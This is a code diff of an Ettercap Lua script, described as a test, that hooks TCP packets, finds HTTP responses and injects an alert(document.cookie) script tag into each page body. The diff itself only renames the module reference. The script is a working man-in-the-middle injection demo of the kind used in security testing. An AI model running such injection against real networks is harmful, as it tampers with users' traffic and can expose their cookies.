@@ -1,7 +1,7 @@
 description = "This is a test script that will inject HTTP stuff";
 
 -- Defines our hook point as being TCP
-hook_point = Ettercap.ffi.C.HOOK_PACKET_TCP;
+hook_point = ettercap.ffi.C.HOOK_PACKET_TCP;
 
 local bit = require('bit')
 
@@ -22,7 +22,7 @@ match_rule = function(po)
     return false
   end
 
-  local buf = Ettercap.ffi.string(po.DATA.data, 7)
+  local buf = ettercap.ffi.string(po.DATA.data, 7)
   local ret = (buf == "HTTP/1.")
   if (ret == true) then
     return true
@@ -33,9 +33,9 @@ end
 
 -- Here's your action.
 action = function(po) 
-  Ettercap.log("inject_http action : called!\n")
+  ettercap.log("inject_http action : called!\n")
   -- Get the full buffer....
-  local buf = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
+  local buf = ettercap.ffi.string(po.DATA.data, po.DATA.len)
   -- Split the header/body up so we can manipulate things.
   local start,finish,header, body = split_http(buf)
   -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
@@ -46,11 +46,11 @@ action = function(po)
     local modified_body = string.gsub(body, '<body>','<body><script>alert(document.cookie)</script>')
     -- We've tweaked things, so let's update the data.
     if (not(modified_body == body)) then
-      Ettercap.log("inject_http action : We modified the HTTP response!\n")
+      ettercap.log("inject_http action : We modified the HTTP response!\n")
       local modified_data = header .. modified_body
-      Ettercap.ffi.copy(po.DATA.data, modified_data, string.len(modified_data))
-      local buf2 = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
-      po.flags = bit.bor(po.flags,Ettercap.ffi.C.PO_MODIFIED)
+      ettercap.ffi.copy(po.DATA.data, modified_data, string.len(modified_data))
+      local buf2 = ettercap.ffi.string(po.DATA.data, po.DATA.len)
+      po.flags = bit.bor(po.flags,ettercap.ffi.C.PO_MODIFIED)
     end
   end
 end
